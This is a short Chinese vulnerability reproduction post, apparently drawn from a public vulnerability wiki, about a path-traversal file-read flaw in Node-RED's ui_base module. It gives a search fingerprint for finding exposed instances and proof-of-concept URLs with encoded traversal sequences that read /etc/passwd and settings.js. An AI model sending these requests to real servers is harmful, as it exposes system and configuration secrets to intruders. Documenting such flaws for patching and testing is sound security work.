---
title: "Node-RED ui_base 任意文件读取漏洞"
date: 2026-10-16 09:08:58
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "Node-RED-ui_base"
tags:
  - "Node-RED-ui_base"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

Node-RED 在/nodes/ui_base.js中，URL与'/ui_base/js/*'匹配，然后传递给path.join，

缺乏对最终路径的验证会导致路径遍历漏洞，可以利用这个漏洞读取服务器上的敏感数据，比如settings.js

## 漏洞影响

```
Node-RED
```

## 网络测绘

```
title="Node-RED"
```

## 漏洞复现

访问页面



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101928889.png)

验证POC



```plain
/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
/ui_base/js/..%2f..%2f..%2f..%2fsettings.js
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101928013.png)



![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101928766.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/Node-RED-ui_base-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
